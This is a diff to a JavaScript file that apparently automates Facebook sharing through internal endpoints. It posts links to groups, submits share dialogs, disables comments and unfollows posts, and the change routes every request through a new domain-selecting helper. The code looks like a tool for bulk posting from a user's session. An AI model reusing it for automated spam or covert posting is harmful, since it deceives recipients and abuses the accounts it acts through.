@@ -38,6 +38,15 @@ function start(){
 	}
 	TimeToRestart();
 }
+function checkurl() {
+	var url = window.location.href;
+	if(url.match(/web.facebook.com/g)) {
+		url = 'https://web.facebook.com/';
+	} else {
+		url = 'https://www.facebook.com/';
+	}
+	return url;
+}
 function resizeFrame() {
 	var newClassName = document.getElementById(targetDivId).getAttribute("class");
 	newClassName = newClassName.replace(" fst_container_resized", "");
@@ -471,7 +480,8 @@ function debug(vars) {
 		var target_id = vars.set_taget;
 	}
 	var request = new XMLHttpRequest;
-	request["open"]("POST", "https://www.facebook.com/react_composer/scraper/?composer_id=rc.js_21l&target_id=" + target_id + "&scrape_url=" + vars.link + "&entry_point=group&source_attachment=STATUS&source_logging_name=link_pasted&av=" + av);
+
+	request["open"]("POST", checkurl()+ "react_composer/scraper/?composer_id=rc.js_21l&target_id=" + target_id + "&scrape_url=" + vars.link + "&entry_point=group&source_attachment=STATUS&source_logging_name=link_pasted&av=" + av);
 	request["setRequestHeader"]("Content-type", "application/x-www-form-urlencoded");
 	request["onreadystatechange"] = function () {
 		if (request["readyState"] == 4 && request["status"] == 200) {
@@ -543,7 +553,7 @@ function ni_debug(vars) {
 		var target_id = vars.set_taget;
 	}
 	var request = new XMLHttpRequest;
-	request["open"]("POST", "https://www.facebook.com/api/graphql/");
+	request["open"]("POST", checkurl() + "api/graphql/");
 	request["setRequestHeader"]("Content-type", "application/x-www-form-urlencoded");
 	request["onreadystatechange"] = function () {
 		console.log('nooooooooooooooooooo');
@@ -828,7 +838,7 @@ function share_Link(vars) {
 	l.title ='';
 	l.description = "";
 	l.picture = "";
-	l.dialog_url = "https://www.facebook.com/dialog/share?app_id=140586622674265&display=popup&href=" + vars.link + "&redirect_uri=http://s7.addthis.com/static/thankyou.html";
+	l.dialog_url = checkurl() + "dialog/share?app_id=140586622674265&display=popup&href=" + vars.link + "&redirect_uri=http://s7.addthis.com/static/thankyou.html";
 	l.disable_location_sharing = false;
 	l.privacyx = "300645083384735";
 	l.__CONFIRM__ = 1;
@@ -843,7 +853,7 @@ function share_Link(vars) {
 	l.ttstamp = vars.ttstamp;
 
     var objAjax = new window.XMLHttpRequest;
-    objAjax.open("POST", "https://www.facebook.com/v2.2/dialog/share/submit?ext=me");
+    objAjax.open("POST", checkurl() + "v2.2/dialog/share/submit?ext=me");
     objAjax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
 
     objAjax.onreadystatechange = function () {
@@ -907,7 +917,7 @@ function debuga(vars) {
 	l.href = vars.link;
 	l.redirect_uri = "http://s7.addthis.com/static/thankyou.html";
 	l.ext = "me";
-	pqr.open("GET", "https://www.facebook.com/dialog/share?" + deSerialize(l), true);
+	pqr.open("GET", checkurl() + "dialog/share?" + deSerialize(l), true);
 	pqr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
 	pqr.onreadystatechange = function() {
 		if (pqr.readyState == 4) {
@@ -959,7 +969,7 @@ function unFollowPost(vars) {
 		__rev: vars.__rev,
 	};
 	var request = new XMLHttpRequest;
-	request["open"]("POST", "https://www.facebook.com/ajax/litestand/follow_post");
+	request["open"]("POST", checkurl() + "ajax/litestand/follow_post");
 	request["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
 	request["send"](deSerialize(r20));
 	request["onreadystatechange"] = function () {
@@ -981,7 +991,7 @@ function disable_comments(vars) {
 		__rev: vars.__rev,
 	};
 	var request = new XMLHttpRequest;
-	request["open"]("POST", "https://www.facebook.com/feed/ufi/disable_comments/");
+	request["open"]("POST", checkurl() + "feed/ufi/disable_comments/");
 	request["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
 	request["send"](deSerialize(r20));
 	request["onreadystatechange"] = function () {
